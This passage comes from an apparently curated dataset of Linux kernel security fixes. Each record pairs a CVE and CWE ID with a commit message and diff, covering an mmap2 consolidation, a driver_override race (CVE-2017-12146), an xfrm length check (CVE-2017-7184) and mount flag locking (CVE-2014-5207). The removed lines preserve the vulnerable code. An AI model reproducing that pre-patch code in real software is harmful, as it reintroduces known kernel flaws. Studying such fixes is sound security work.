\t\tgoto out;\n \n-\terror = do_mmap2(a.addr, a.len, a.prot, a.flags, a.fd, a.offset >> PAGE_SHIFT);\n+\terror = sys_mmap_pgoff(a.addr, a.len, a.prot, a.flags, a.fd, a.offset >> PAGE_SHIFT);\n out:\n \treturn error;\n }\ndiff --git a\/arch\/score\/kernel\/sys_score.c b\/arch\/score\/kernel\/sys_score.c\nindex 001249469866..3d6a67dd628c 100644\n--- a\/arch\/score\/kernel\/sys_score.c\n+++ b\/arch\/score\/kernel\/sys_score.c\n@@ -36,34 +36,15 @@ asmlinkage long\n sys_mmap2(unsigned long addr, unsigned long len, unsigned long prot,\n \t  unsigned long flags, unsigned long fd, unsigned long pgoff)\n {\n-\tint error = -EBADF;\n-\tstruct file *file = NULL;\n-\n-\tif (pgoff & (~PAGE_MASK >> 12))\n-\t\treturn -EINVAL;\n-\n-\tflags &= ~(MAP_EXECUTABLE | MAP_DENYWRITE);\n-\tif (!(flags & MAP_ANONYMOUS)) {\n-\t\tfile = fget(fd);\n-\t\tif (!file)\n-\t\t\treturn error;\n-\t}\n-\n-\tdown_write(&current->mm->mmap_sem);\n-\terror = do_mmap_pgoff(file, addr, len, prot, flags, pgoff);\n-\tup_write(&current->mm->mmap_sem);\n-\n-\tif (file)\n-\t\tfput(file);\n-\n-\treturn error;\n+\treturn sys_mmap_pgoff(addr, len, prot, flags, fd, pgoff);\n }\n \n asmlinkage long\n sys_mmap(unsigned long addr, unsigned long len, unsigned long prot,\n \tunsigned long flags, unsigned long fd, off_t pgoff)\n {\n-\treturn sys_mmap2(addr, len, prot, flags, fd, pgoff >> PAGE_SHIFT);\n+\t\/* where's the alignment check? *\/\n+\treturn sys_mmap_pgoff(addr, len, prot, flags, fd, pgoff >> PAGE_SHIFT);\n }\n \n asmlinkage long\ndiff --git a\/arch\/sh\/kernel\/sys_sh.c b\/arch\/sh\/kernel\/sys_sh.c\nindex 8aa5d1ceaf14..71399cde03b5 100644\n--- a\/arch\/sh\/kernel\/sys_sh.c\n+++ b\/arch\/sh\/kernel\/sys_sh.c\n@@ -28,37 +28,13 @@\n #include <asm\/cacheflush.h>\n #include <asm\/cachectl.h>\n \n-static inline long\n-do_mmap2(unsigned long addr, unsigned long len, unsigned long prot,\n-\t unsigned long flags, int fd, unsigned long pgoff)\n-{\n-\tint error = -EBADF;\n-\tstruct file *file = NULL;\n-\n-\tflags &= ~(MAP_EXECUTABLE | MAP_DENYWRITE);\n-\tif (!(flags & MAP_ANONYMOUS)) {\n-\t\tfile = fget(fd);\n-\t\tif (!file)\n-\t\t\tgoto out;\n-\t}\n-\n-\tdown_write(&current->mm->mmap_sem);\n-\terror = do_mmap_pgoff(file, addr, len, prot, flags, pgoff);\n-\tup_write(&current->mm->mmap_sem);\n-\n-\tif (file)\n-\t\tfput(file);\n-out:\n-\treturn error;\n-}\n-\n asmlinkage int old_mmap(unsigned long addr, unsigned long len,\n \tunsigned long prot, unsigned long flags,\n \tint fd, unsigned long off)\n {\n \tif (off & ~PAGE_MASK)\n \t\treturn -EINVAL;\n-\treturn do_mmap2(addr, len, prot, flags, fd, off>>PAGE_SHIFT);\n+\treturn sys_mmap_pgoff(addr, len, prot, flags, fd, off>>PAGE_SHIFT);\n }\n \n asmlinkage long sys_mmap2(unsigned long addr, unsigned long len,\n@@ -74,7 +50,7 @@ asmlinkage long sys_mmap2(unsigned long addr, unsigned long len,\n \n \tpgoff >>= PAGE_SHIFT - 12;\n \n-\treturn do_mmap2(addr, len, prot, flags, fd, pgoff);\n+\treturn sys_mmap_pgoff(addr, len, prot, flags, fd, pgoff);\n }\n \n \/*\ndiff --git a\/arch\/sparc\/kernel\/sys_sparc_32.c b\/arch\/sparc\/kernel\/sys_sparc_32.c\nindex 10c43bea32c7..36f6f26d9cec 100644\n--- a\/arch\/sparc\/kernel\/sys_sparc_32.c\n+++ b\/arch\/sparc\/kernel\/sys_sparc_32.c\n@@ -234,31 +234,6 @@ int sparc_mmap_check(unsigned long addr, unsigned long len)\n }\n \n \/* Linux version of mmap *\/\n-static unsigned long do_mmap2(unsigned long addr, unsigned long len,\n-\tunsigned long prot, unsigned long flags, unsigned long fd,\n-\tunsigned long pgoff)\n-{\n-\tstruct file * file = NULL;\n-\tunsigned long retval = -EBADF;\n-\n-\tif (!(flags & MAP_ANONYMOUS)) {\n-\t\tfile = fget(fd);\n-\t\tif (!file)\n-\t\t\tgoto out;\n-\t}\n-\n-\tlen = PAGE_ALIGN(len);\n-\tflags &= ~(MAP_EXECUTABLE | MAP_DENYWRITE);\n-\n-\tdown_write(&current->mm->mmap_sem);\n-\tretval = do_mmap_pgoff(file, addr, len, prot, flags, pgoff);\n-\tup_write(&current->mm->mmap_sem);\n-\n-\tif (file)\n-\t\tfput(file);\n-out:\n-\treturn retval;\n-}\n \n asmlinkage unsigned long sys_mmap2(unsigned long addr, unsigned long len,\n \tunsigned long prot, unsigned long flags, unsigned long fd,\n@@ -266,14 +241,16 @@ asmlinkage unsigned long sys_mmap2(unsigned long addr, unsigned long len,\n {\n \t\/* Make sure the shift for mmap2 is constant (12), no matter what PAGE_SIZE\n \t   we have. *\/\n-\treturn do_mmap2(addr, len, prot, flags, fd, pgoff >> (PAGE_SHIFT - 12));\n+\treturn sys_mmap_pgoff(addr, len, prot, flags, fd,\n+\t\t\t      pgoff >> (PAGE_SHIFT - 12));\n }\n \n asmlinkage unsigned long sys_mmap(unsigned long addr, unsigned long len,\n \tunsigned long prot, unsigned long flags, unsigned long fd,\n \tunsigned long off)\n {\n-\treturn do_mmap2(addr, len, prot, flags, fd, off >> PAGE_SHIFT);\n+\t\/* no alignment check? *\/\n+\treturn sys_mmap_pgoff(addr, len, prot, flags, fd, off >> PAGE_SHIFT);\n }\n \n long sparc_remap_file_pages(unsigned long start, unsigned long size,\ndiff --git a\/arch\/sparc\/kernel\/sys_sparc_64.c b\/arch\/sparc\/kernel\/sys_sparc_64.c\nindex d498b32c75f6..8f9cd58497de 100644\n--- a\/arch\/sparc\/kernel\/sys_sparc_64.c\n+++ b\/arch\/sparc\/kernel\/sys_sparc_64.c\n@@ -572,23 +572,13 @@ SYSCALL_DEFINE6(mmap, unsigned long, addr, unsigned long, len,\n \t\tunsigned long, prot, unsigned long, flags, unsigned long, fd,\n \t\tunsigned long, off)\n {\n-\tstruct file * file = NULL;\n-\tunsigned long retval = -EBADF;\n+\tunsigned long retval = -EINVAL;\n \n-\tif (!(flags & MAP_ANONYMOUS)) {\n-\t\tfile = fget(fd);\n-\t\tif (!file)\n-\t\t\tgoto out;\n-\t}\n-\tflags &= ~(MAP_EXECUTABLE | MAP_DENYWRITE);\n-\tlen = PAGE_ALIGN(len);\n-\n-\tdown_write(&current->mm->mmap_sem);\n-\tretval = do_mmap(file, addr, len, prot, flags, off);\n-\tup_write(&current->mm->mmap_sem);\n-\n-\tif (file)\n-\t\tfput(file);\n+\tif ((off + PAGE_ALIGN(len)) < off)\n+\t\tgoto out;\n+\tif (off & ~PAGE_MASK)\n+\t\tgoto out;\n+\tretval = sys_mmap_pgoff(addr, len, prot, flags, fd, off >> PAGE_SHIFT);\n out:\n \treturn retval;\n }\ndiff --git a\/arch\/um\/kernel\/syscall.c b\/arch\/um\/kernel\/syscall.c\nindex a4625c7b2bf9..cccab850c27e 100644\n--- a\/arch\/um\/kernel\/syscall.c\n+++ b\/arch\/um\/kernel\/syscall.c\n@@ -8,6 +8,7 @@\n #include \"linux\/mm.h\"\n #include \"linux\/sched.h\"\n #include \"linux\/utsname.h\"\n+#include \"linux\/syscalls.h\"\n #include \"asm\/current.h\"\n #include \"asm\/mman.h\"\n #include \"asm\/uaccess.h\"\n@@ -37,31 +38,6 @@ long sys_vfork(void)\n \treturn ret;\n }\n \n-\/* common code for old and new mmaps *\/\n-long sys_mmap2(unsigned long addr, unsigned long len,\n-\t       unsigned long prot, unsigned long flags,\n-\t       unsigned long fd, unsigned long pgoff)\n-{\n-\tlong error = -EBADF;\n-\tstruct file * file = NULL;\n-\n-\tflags &= ~(MAP_EXECUTABLE | MAP_DENYWRITE);\n-\tif (!(flags & MAP_ANONYMOUS)) {\n-\t\tfile = fget(fd);\n-\t\tif (!file)\n-\t\t\tgoto out;\n-\t}\n-\n-\tdown_write(&current->mm->mmap_sem);\n-\terror = do_mmap_pgoff(file, addr, len, prot, flags, pgoff);\n-\tup_write(&current->mm->mmap_sem);\n-\n-\tif (file)\n-\t\tfput(file);\n- out:\n-\treturn error;\n-}\n-\n long old_mmap(unsigned long addr, unsigned long len,\n \t      unsigned long prot, unsigned long flags,\n \t      unsigned long fd, unsigned long offset)\n@@ -70,7 +46,7 @@ long old_mmap(unsigned long addr, unsigned long len,\n \tif (offset & ~PAGE_MASK)\n \t\tgoto out;\n \n-\terr = sys_mmap2(addr, len, prot, flags, fd, offset >> PAGE_SHIFT);\n+\terr = sys_mmap_pgoff(addr, len, prot, flags, fd, offset >> PAGE_SHIFT);\n  out:\n \treturn err;\n }\ndiff --git a\/arch\/um\/sys-i386\/shared\/sysdep\/syscalls.h b\/arch\/um\/sys-i386\/shared\/sysdep\/syscalls.h\nindex 905698197e35..e7787679e317 100644\n--- a\/arch\/um\/sys-i386\/shared\/sysdep\/syscalls.h\n+++ b\/arch\/um\/sys-i386\/shared\/sysdep\/syscalls.h\n@@ -20,7 +20,3 @@ extern syscall_handler_t *sys_call_table[];\n #define EXECUTE_SYSCALL(syscall, regs) \\\n \t((long (*)(struct syscall_args)) \\\n \t (*sys_call_table[syscall]))(SYSCALL_ARGS(&regs->regs))\n-\n-extern long sys_mmap2(unsigned long addr, unsigned long len,\n-\t\t      unsigned long prot, unsigned long flags,\n-\t\t      unsigned long fd, unsigned long pgoff);\ndiff --git a\/arch\/x86\/ia32\/ia32entry.S b\/arch\/x86\/ia32\/ia32entry.S\nindex 4eefdca9832b..53147ad85b96 100644\n--- a\/arch\/x86\/ia32\/ia32entry.S\n+++ b\/arch\/x86\/ia32\/ia32entry.S\n@@ -696,7 +696,7 @@ ia32_sys_call_table:\n \t.quad quiet_ni_syscall\t\t\/* streams2 *\/\n \t.quad stub32_vfork            \/* 190 *\/\n \t.quad compat_sys_getrlimit\n-\t.quad sys32_mmap2\n+\t.quad sys_mmap_pgoff\n \t.quad sys32_truncate64\n \t.quad sys32_ftruncate64\n \t.quad sys32_stat64\t\t\/* 195 *\/\ndiff --git a\/arch\/x86\/ia32\/sys_ia32.c b\/arch\/x86\/ia32\/sys_ia32.c\nindex df82c0e48ded..422572c77923 100644\n--- a\/arch\/x86\/ia32\/sys_ia32.c\n+++ b\/arch\/x86\/ia32\/sys_ia32.c\n@@ -155,9 +155,6 @@ struct mmap_arg_struct {\n asmlinkage long sys32_mmap(struct mmap_arg_struct __user *arg)\n {\n \tstruct mmap_arg_struct a;\n-\tstruct file *file = NULL;\n-\tunsigned long retval;\n-\tstruct mm_struct *mm ;\n \n \tif (copy_from_user(&a, arg, sizeof(a)))\n \t\treturn -EFAULT;\n@@ -165,22 +162,8 @@ asmlinkage long sys32_mmap(struct mmap_arg_struct __user *arg)\n \tif (a.offset & ~PAGE_MASK)\n \t\treturn -EINVAL;\n \n-\tif (!(a.flags & MAP_ANONYMOUS)) {\n-\t\tfile = fget(a.fd);\n-\t\tif (!file)\n-\t\t\treturn -EBADF;\n-\t}\n-\n-\tmm = current->mm;\n-\tdown_write(&mm->mmap_sem);\n-\tretval = do_mmap_pgoff(file, a.addr, a.len, a.prot, a.flags,\n+\treturn sys_mmap_pgoff(a.addr, a.len, a.prot, a.flags, a.fd,\n \t\t\t       a.offset>>PAGE_SHIFT);\n-\tif (file)\n-\t\tfput(file);\n-\n-\tup_write(&mm->mmap_sem);\n-\n-\treturn retval;\n }\n \n asmlinkage long sys32_mprotect(unsigned long start, size_t len,\n@@ -483,30 +466,6 @@ asmlinkage long sys32_sendfile(int out_fd, int in_fd,\n \treturn ret;\n }\n \n-asmlinkage long sys32_mmap2(unsigned long addr, unsigned long len,\n-\t\t\t    unsigned long prot, unsigned long flags,\n-\t\t\t    unsigned long fd, unsigned long pgoff)\n-{\n-\tstruct mm_struct *mm = current->mm;\n-\tunsigned long error;\n-\tstruct file *file = NULL;\n-\n-\tflags &= ~(MAP_EXECUTABLE | MAP_DENYWRITE);\n-\tif (!(flags & MAP_ANONYMOUS)) {\n-\t\tfile = fget(fd);\n-\t\tif (!file)\n-\t\t\treturn -EBADF;\n-\t}\n-\n-\tdown_write(&mm->mmap_sem);\n-\terror = do_mmap_pgoff(file, addr, len, prot, flags, pgoff);\n-\tup_write(&mm->mmap_sem);\n-\n-\tif (file)\n-\t\tfput(file);\n-\treturn error;\n-}\n-\n asmlinkage long sys32_olduname(struct oldold_utsname __user *name)\n {\n \tchar *arch = \"x86_64\";\ndiff --git a\/arch\/x86\/include\/asm\/sys_ia32.h b\/arch\/x86\/include\/asm\/sys_ia32.h\nindex 9af9decb38c3..4a5a089e1c62 100644\n--- a\/arch\/x86\/include\/asm\/sys_ia32.h\n+++ b\/arch\/x86\/include\/asm\/sys_ia32.h\n@@ -57,9 +57,6 @@ asmlinkage long sys32_pwrite(unsigned int, char __user *, u32, u32, u32);\n asmlinkage long sys32_personality(unsigned long);\n asmlinkage long sys32_sendfile(int, int, compat_off_t __user *, s32);\n \n-asmlinkage long sys32_mmap2(unsigned long, unsigned long, unsigned long,\n-\t\t\t    unsigned long, unsigned long, unsigned long);\n-\n struct oldold_utsname;\n struct old_utsname;\n asmlinkage long sys32_olduname(struct oldold_utsname __user *);\ndiff --git a\/arch\/x86\/include\/asm\/syscalls.h b\/arch\/x86\/include\/asm\/syscalls.h\nindex 372b76edd63f..1bb6e395881c 100644\n--- a\/arch\/x86\/include\/asm\/syscalls.h\n+++ b\/arch\/x86\/include\/asm\/syscalls.h\n@@ -55,8 +55,6 @@ struct sel_arg_struct;\n struct oldold_utsname;\n struct old_utsname;\n \n-asmlinkage long sys_mmap2(unsigned long, unsigned long, unsigned long,\n-\t\t\t  unsigned long, unsigned long, unsigned long);\n asmlinkage int old_mmap(struct mmap_arg_struct __user *);\n asmlinkage int old_select(struct sel_arg_struct __user *);\n asmlinkage int sys_ipc(uint, int, int, int, void __user *, long);\ndiff --git a\/arch\/x86\/kernel\/sys_i386_32.c b\/arch\/x86\/kernel\/sys_i386_32.c\nindex 1884a8d12bfa..dee1ff7cba58 100644\n--- a\/arch\/x86\/kernel\/sys_i386_32.c\n+++ b\/arch\/x86\/kernel\/sys_i386_32.c\n@@ -24,31 +24,6 @@\n \n #include <asm\/syscalls.h>\n \n-asmlinkage long sys_mmap2(unsigned long addr, unsigned long len,\n-\t\t\t  unsigned long prot, unsigned long flags,\n-\t\t\t  unsigned long fd, unsigned long pgoff)\n-{\n-\tint error = -EBADF;\n-\tstruct file *file = NULL;\n-\tstruct mm_struct *mm = current->mm;\n-\n-\tflags &= ~(MAP_EXECUTABLE | MAP_DENYWRITE);\n-\tif (!(flags & MAP_ANONYMOUS)) {\n-\t\tfile = fget(fd);\n-\t\tif (!file)\n-\t\t\tgoto out;\n-\t}\n-\n-\tdown_write(&mm->mmap_sem);\n-\terror = do_mmap_pgoff(file, addr, len, prot, flags, pgoff);\n-\tup_write(&mm->mmap_sem);\n-\n-\tif (file)\n-\t\tfput(file);\n-out:\n-\treturn error;\n-}\n-\n \/*\n  * Perform the select(nd, in, out, ex, tv) and mmap() system\n  * calls. Linux\/i386 didn't use to be able to handle more than\n@@ -77,7 +52,7 @@ asmlinkage int old_mmap(struct mmap_arg_struct __user *arg)\n \tif (a.offset & ~PAGE_MASK)\n \t\tgoto out;\n \n-\terr = sys_mmap2(a.addr, a.len, a.prot, a.flags,\n+\terr = sys_mmap_pgoff(a.addr, a.len, a.prot, a.flags,\n \t\t\ta.fd, a.offset >> PAGE_SHIFT);\n out:\n \treturn err;\ndiff --git a\/arch\/x86\/kernel\/sys_x86_64.c b\/arch\/x86\/kernel\/sys_x86_64.c\nindex 45e00eb09c3a..8aa2057efd12 100644\n--- a\/arch\/x86\/kernel\/sys_x86_64.c\n+++ b\/arch\/x86\/kernel\/sys_x86_64.c\n@@ -23,26 +23,11 @@ SYSCALL_DEFINE6(mmap, unsigned long, addr, unsigned long, len,\n \t\tunsigned long, fd, unsigned long, off)\n {\n \tlong error;\n-\tstruct file *file;\n-\n \terror = -EINVAL;\n \tif (off & ~PAGE_MASK)\n \t\tgoto out;\n \n-\terror = -EBADF;\n-\tfile = NULL;\n-\tflags &= ~(MAP_EXECUTABLE | MAP_DENYWRITE);\n-\tif (!(flags & MAP_ANONYMOUS)) {\n-\t\tfile = fget(fd);\n-\t\tif (!file)\n-\t\t\tgoto out;\n-\t}\n-\tdown_write(&current->mm->mmap_sem);\n-\terror = do_mmap_pgoff(file, addr, len, prot, flags, off >> PAGE_SHIFT);\n-\tup_write(&current->mm->mmap_sem);\n-\n-\tif (file)\n-\t\tfput(file);\n+\terror = sys_mmap_pgoff(addr, len, prot, flags, fd, off >> PAGE_SHIFT);\n out:\n \treturn error;\n }\ndiff --git a\/arch\/x86\/kernel\/syscall_table_32.S b\/arch\/x86\/kernel\/syscall_table_32.S\nindex 70c2125d55b9..15228b5d3eb7 100644\n--- a\/arch\/x86\/kernel\/syscall_table_32.S\n+++ b\/arch\/x86\/kernel\/syscall_table_32.S\n@@ -191,7 +191,7 @@ ENTRY(sys_call_table)\n \t.long sys_ni_syscall\t\/* reserved for streams2 *\/\n \t.long ptregs_vfork\t\/* 190 *\/\n \t.long sys_getrlimit\n-\t.long sys_mmap2\n+\t.long sys_mmap_pgoff\n \t.long sys_truncate64\n \t.long sys_ftruncate64\n \t.long sys_stat64\t\/* 195 *\/\ndiff --git a\/arch\/xtensa\/include\/asm\/syscall.h b\/arch\/xtensa\/include\/asm\/syscall.h\nindex 05cebf8f62b1..4352dbe1186a 100644\n--- a\/arch\/xtensa\/include\/asm\/syscall.h\n+++ b\/arch\/xtensa\/include\/asm\/syscall.h\n@@ -13,8 +13,6 @@ struct sigaction;\n asmlinkage long xtensa_execve(char*, char**, char**, struct pt_regs*);\n asmlinkage long xtensa_clone(unsigned long, unsigned long, struct pt_regs*);\n asmlinkage long xtensa_pipe(int __user *);\n-asmlinkage long xtensa_mmap2(unsigned long, unsigned long, unsigned long,\n-    \t\t\t     unsigned long, unsigned long, unsigned long);\n asmlinkage long xtensa_ptrace(long, long, long, long);\n asmlinkage long xtensa_sigreturn(struct pt_regs*);\n asmlinkage long xtensa_rt_sigreturn(struct pt_regs*);\ndiff --git a\/arch\/xtensa\/include\/asm\/unistd.h b\/arch\/xtensa\/include\/asm\/unistd.h\nindex 4e55dc763021..fbf318b3af3e 100644\n--- a\/arch\/xtensa\/include\/asm\/unistd.h\n+++ b\/arch\/xtensa\/include\/asm\/unistd.h\n@@ -189,7 +189,7 @@ __SYSCALL( 79, sys_fremovexattr, 2)\n \/* File Map \/ Shared Memory Operations *\/\n \n #define __NR_mmap2 \t\t\t\t 80\n-__SYSCALL( 80, xtensa_mmap2, 6)\n+__SYSCALL( 80, sys_mmap_pgoff, 6)\n #define __NR_munmap \t\t\t\t 81\n __SYSCALL( 81, sys_munmap, 2)\n #define __NR_mprotect \t\t\t\t 82\ndiff --git a\/arch\/xtensa\/kernel\/syscall.c b\/arch\/xtensa\/kernel\/syscall.c\nindex ac15ecbdf919..1e67bab775c1 100644\n--- a\/arch\/xtensa\/kernel\/syscall.c\n+++ b\/arch\/xtensa\/kernel\/syscall.c\n@@ -57,31 +57,6 @@ asmlinkage long xtensa_pipe(int __user *userfds)\n \treturn error;\n }\n \n-\n-asmlinkage long xtensa_mmap2(unsigned long addr, unsigned long len,\n-   \t\t\t     unsigned long prot, unsigned long flags,\n-\t\t\t     unsigned long fd, unsigned long pgoff)\n-{\n-\tint error = -EBADF;\n-\tstruct file * file = NULL;\n-\n-\tflags &= ~(MAP_EXECUTABLE | MAP_DENYWRITE);\n-\tif (!(flags & MAP_ANONYMOUS)) {\n-\t\tfile = fget(fd);\n-\t\tif (!file)\n-\t\t\tgoto out;\n-\t}\n-\n-\tdown_write(&current->mm->mmap_sem);\n-\terror = do_mmap_pgoff(file, addr, len, prot, flags, pgoff);\n-\tup_write(&current->mm->mmap_sem);\n-\n-\tif (file)\n-\t\tfput(file);\n-out:\n-\treturn error;\n-}\n-\n asmlinkage long xtensa_shmat(int shmid, char __user *shmaddr, int shmflg)\n {\n \tunsigned long ret;\ndiff --git a\/include\/linux\/syscalls.h b\/include\/linux\/syscalls.h\nindex bc70c5810fec..939a61507ac5 100644\n--- a\/include\/linux\/syscalls.h\n+++ b\/include\/linux\/syscalls.h\n@@ -834,4 +834,8 @@ int kernel_execve(const char *filename, char *const argv[], char *const envp[]);\n asmlinkage long sys_perf_event_open(\n \t\tstruct perf_event_attr __user *attr_uptr,\n \t\tpid_t pid, int cpu, int group_fd, unsigned long flags);\n+\n+asmlinkage long sys_mmap_pgoff(unsigned long addr, unsigned long len,\n+\t\t\tunsigned long prot, unsigned long flags,\n+\t\t\tunsigned long fd, unsigned long pgoff);\n #endif\ndiff --git a\/mm\/util.c b\/mm\/util.c\nindex 7c35ad95f927..3bf81b294ae8 100644\n--- a\/mm\/util.c\n+++ b\/mm\/util.c\n@@ -4,6 +4,10 @@\n #include <linux\/module.h>\n #include <linux\/err.h>\n #include <linux\/sched.h>\n+#include <linux\/hugetlb.h>\n+#include <linux\/syscalls.h>\n+#include <linux\/mman.h>\n+#include <linux\/file.h>\n #include <asm\/uaccess.h>\n \n #define CREATE_TRACE_POINTS\n@@ -268,6 +272,31 @@ int __attribute__((weak)) get_user_pages_fast(unsigned long start,\n }\n EXPORT_SYMBOL_GPL(get_user_pages_fast);\n \n+SYSCALL_DEFINE6(mmap_pgoff, unsigned long, addr, unsigned long, len,\n+\t\tunsigned long, prot, unsigned long, flags,\n+\t\tunsigned long, fd, unsigned long, pgoff)\n+{\n+\tstruct file * file = NULL;\n+\tunsigned long retval = -EBADF;\n+\n+\tif (!(flags & MAP_ANONYMOUS)) {\n+\t\tfile = fget(fd);\n+\t\tif (!file)\n+\t\t\tgoto out;\n+\t}\n+\n+\tflags &= ~(MAP_EXECUTABLE | MAP_DENYWRITE);\n+\n+\tdown_write(&current->mm->mmap_sem);\n+\tretval = do_mmap_pgoff(file, addr, len, prot, flags, pgoff);\n+\tup_write(&current->mm->mmap_sem);\n+\n+\tif (file)\n+\t\tfput(file);\n+out:\n+\treturn retval;\n+}\n+\n \/* Tracepoints definitions. *\/\n EXPORT_TRACEPOINT_SYMBOL(kmalloc);\n EXPORT_TRACEPOINT_SYMBOL(kmem_cache_alloc);\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2017-12146","CWE_ID":"264","category":"security","commit_id":"6265539776a0810b7ce6398c27866ddb9c6bd154","commit_message":"From 6265539776a0810b7ce6398c27866ddb9c6bd154 Mon Sep 17 00:00:00 2001\nFrom: Adrian Salido <salidoa@google.com>\nDate: Tue, 25 Apr 2017 16:55:26 -0700\nSubject: driver core: platform: fix race condition with driver_override\n\nThe driver_override implementation is susceptible to race condition when\ndifferent threads are reading vs storing a different driver override.\nAdd locking to avoid race condition.\n\nFixes: 3d713e0e382e (\"driver core: platform: add device binding path 'driver_override'\")\nCc: stable@vger.kernel.org\nSigned-off-by: Adrian Salido <salidoa@google.com>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>\n---\n drivers\/base\/platform.c | 11 +++++++++--\n 1 file changed, 9 insertions(+), 2 deletions(-)\n\n","diff_code":"diff --git a\/drivers\/base\/platform.c b\/drivers\/base\/platform.c\nindex a102152301c8..97332d094fe2 100644\n--- a\/drivers\/base\/platform.c\n+++ b\/drivers\/base\/platform.c\n@@ -866,7 +866,7 @@ static ssize_t driver_override_store(struct device *dev,\n \t\t\t\t     const char *buf, size_t count)\n {\n \tstruct platform_device *pdev = to_platform_device(dev);\n-\tchar *driver_override, *old = pdev->driver_override, *cp;\n+\tchar *driver_override, *old, *cp;\n \n \tif (count > PATH_MAX)\n \t\treturn -EINVAL;\n@@ -879,12 +879,15 @@ static ssize_t driver_override_store(struct device *dev,\n \tif (cp)\n \t\t*cp = '\\0';\n \n+\tdevice_lock(dev);\n+\told = pdev->driver_override;\n \tif (strlen(driver_override)) {\n \t\tpdev->driver_override = driver_override;\n \t} else {\n \t\tkfree(driver_override);\n \t\tpdev->driver_override = NULL;\n \t}\n+\tdevice_unlock(dev);\n \n \tkfree(old);\n \n@@ -895,8 +898,12 @@ static ssize_t driver_override_show(struct device *dev,\n \t\t\t\t    struct device_attribute *attr, char *buf)\n {\n \tstruct platform_device *pdev = to_platform_device(dev);\n+\tssize_t len;\n \n-\treturn sprintf(buf, \"%s\\n\", pdev->driver_override);\n+\tdevice_lock(dev);\n+\tlen = sprintf(buf, \"%s\\n\", pdev->driver_override);\n+\tdevice_unlock(dev);\n+\treturn len;\n }\n static DEVICE_ATTR_RW(driver_override);\n \n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2017-7184","CWE_ID":"264","category":"security","commit_id":"f843ee6dd019bcece3e74e76ad9df0155655d0df","commit_message":"From f843ee6dd019bcece3e74e76ad9df0155655d0df Mon Sep 17 00:00:00 2001\nFrom: Andy Whitcroft <apw@canonical.com>\nDate: Thu, 23 Mar 2017 07:45:44 +0000\nSubject: [PATCH] xfrm_user: validate XFRM_MSG_NEWAE incoming ESN size harder\n\nKees Cook has pointed out that xfrm_replay_state_esn_len() is subject to\nwrapping issues.  To ensure we are correctly ensuring that the two ESN\nstructures are the same size compare both the overall size as reported\nby xfrm_replay_state_esn_len() and the internal length are the same.\n\nCVE-2017-7184\nSigned-off-by: Andy Whitcroft <apw@canonical.com>\nAcked-by: Steffen Klassert <steffen.klassert@secunet.com>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n net\/xfrm\/xfrm_user.c | 6 +++++-\n 1 file changed, 5 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/net\/xfrm\/xfrm_user.c b\/net\/xfrm\/xfrm_user.c\nindex cdf887fa61d57..40a8aa39220d6 100644\n--- a\/net\/xfrm\/xfrm_user.c\n+++ b\/net\/xfrm\/xfrm_user.c\n@@ -412,7 +412,11 @@ static inline int xfrm_replay_verify_len(struct xfrm_replay_state_esn *replay_es\n \tup = nla_data(rp);\n \tulen = xfrm_replay_state_esn_len(up);\n \n-\tif (nla_len(rp) < ulen || xfrm_replay_state_esn_len(replay_esn) != ulen)\n+\t\/* Check the overall length and the internal bitmap length to avoid\n+\t * potential overflow. *\/\n+\tif (nla_len(rp) < ulen ||\n+\t    xfrm_replay_state_esn_len(replay_esn) != ulen ||\n+\t    replay_esn->bmp_len != up->bmp_len)\n \t\treturn -EINVAL;\n \n \tif (up->replay_window > up->bmp_len * sizeof(__u32) * 8)\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2014-5207","CWE_ID":"264","category":"security","commit_id":"9566d6742852c527bf5af38af5cbb878dad75705","commit_message":"From 9566d6742852c527bf5af38af5cbb878dad75705 Mon Sep 17 00:00:00 2001\nFrom: \"Eric W. Biederman\" <ebiederm@xmission.com>\nDate: Mon, 28 Jul 2014 17:26:07 -0700\nSubject: mnt: Correct permission checks in do_remount\n\nWhile invesgiating the issue where in \"mount --bind -oremount,ro ...\"\nwould result in later \"mount --bind -oremount,rw\" succeeding even if\nthe mount started off locked I realized that there are several\nadditional mount flags that should be locked and are not.\n\nIn particular MNT_NOSUID, MNT_NODEV, MNT_NOEXEC, and the atime\nflags in addition to MNT_READONLY should all be locked.  These\nflags are all per superblock, can all be changed with MS_BIND,\nand should not be changable if set by a more privileged user.\n\nThe following additions to the current logic are added in this patch.\n- nosuid may not be clearable by a less privileged user.\n- nodev  may not be clearable by a less privielged user.\n- noexec may not be clearable by a less privileged user.\n- atime flags may not be changeable by a less privileged user.\n\nThe logic with atime is that always setting atime on access is a\nglobal policy and backup software and auditing software could break if\natime bits are not updated (when they are configured to be updated),\nand serious performance degradation could result (DOS attack) if atime\nupdates happen when they have been explicitly disabled.  Therefore an\nunprivileged user should not be able to mess with the atime bits set\nby a more privileged user.\n\nThe additional restrictions are implemented with the addition of\nMNT_LOCK_NOSUID, MNT_LOCK_NODEV, MNT_LOCK_NOEXEC, and MNT_LOCK_ATIME\nmnt flags.\n\nTaken together these changes and the fixes for MNT_LOCK_READONLY\nshould make it safe for an unprivileged user to create a user\nnamespace and to call \"mount --bind -o remount,... ...\" without\nthe danger of mount flags being changed maliciously.\n\nCc: stable@vger.kernel.org\nAcked-by: Serge E. Hallyn <serge.hallyn@ubuntu.com>\nSigned-off-by: \"Eric W. Biederman\" <ebiederm@xmission.com>\n---\n fs\/namespace.c        | 36 +++++++++++++++++++++++++++++++++---\n include\/linux\/mount.h |  5 +++++\n 2 files changed, 38 insertions(+), 3 deletions(-)\n\n","diff_code":"diff --git a\/fs\/namespace.c b\/fs\/namespace.c\nindex 1105a577a14f..dd9c93b5a9d5 100644\n--- a\/fs\/namespace.c\n+++ b\/fs\/namespace.c\n@@ -890,8 +890,21 @@ static struct mount *clone_mnt(struct mount *old, struct dentry *root,\n \n \tmnt->mnt.mnt_flags = old->mnt.mnt_flags & ~(MNT_WRITE_HOLD|MNT_MARKED);\n \t\/* Don't allow unprivileged users to change mount flags *\/\n-\tif ((flag & CL_UNPRIVILEGED) && (mnt->mnt.mnt_flags & MNT_READONLY))\n-\t\tmnt->mnt.mnt_flags |= MNT_LOCK_READONLY;\n+\tif (flag & CL_UNPRIVILEGED) {\n+\t\tmnt->mnt.mnt_flags |= 